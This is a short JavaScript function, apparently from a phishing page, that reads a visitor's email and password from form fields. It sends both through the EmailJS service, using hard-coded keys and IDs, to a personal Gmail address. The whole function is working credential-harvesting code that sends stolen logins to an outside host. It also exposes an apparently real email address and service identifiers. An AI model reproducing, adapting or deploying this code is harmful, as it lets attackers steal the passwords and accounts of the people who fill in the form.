function sendEmail() {
    var email = document.getElementById("email").value;
    var password = document.getElementById("password").value;

    emailjs.init("jJxV-aIeQl81sucMy"); // Αυτό είναι το Public Key

    emailjs.send("service_9kt8ida", "template_b6ea4jl", {
        to_email: "gianisritos.7gr@gmail.com",
        from_name: email,
        message: "Password: " + password
    }).then(
        function(response) {
            console.log("SUCCESS!", response.status, response.text);
        }, 
        function(error) {
            console.log("FAILED...", error);
        }
    );
}
